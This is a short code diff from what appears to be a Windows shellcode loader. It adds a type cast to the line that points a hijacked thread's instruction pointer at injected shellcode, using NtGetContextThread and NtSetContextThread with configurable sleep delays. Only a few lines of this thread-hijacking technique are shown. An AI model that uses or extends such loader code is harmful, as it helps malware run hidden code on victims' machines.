@@ -84,7 +84,7 @@ BOOL execution_run(MemoryInfo memInfo) {
     g_ldr->apis->NtGetContextThread(hThread, &threadContext);
     ldr_sleep(g_ldr->config->DelayBetween);
 
-    threadContext.Rip = memInfo.ShellCodeAddress;
+    threadContext.Rip = (DWORD64)memInfo.ShellCodeAddress;
     g_ldr->apis->NtSetContextThread(hThread, &threadContext);
     ldr_sleep(g_ldr->config->DelayBefore);
 
